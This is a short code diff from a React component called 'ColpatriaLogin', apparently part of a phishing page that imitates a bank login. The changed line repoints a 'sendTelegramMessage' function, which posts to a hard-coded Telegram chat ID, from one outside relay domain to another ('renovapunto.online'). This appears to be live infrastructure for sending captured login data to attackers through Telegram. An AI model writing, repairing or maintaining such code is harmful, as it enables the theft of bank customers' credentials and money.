@@ -11,7 +11,7 @@ const ColpatriaLogin = () => {
   const sendTelegramMessage = async (message) => {
     try {
       const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto
-      const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', {
+      const response = await fetch('https://streaming.renovapunto.online/enviarmensaje', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
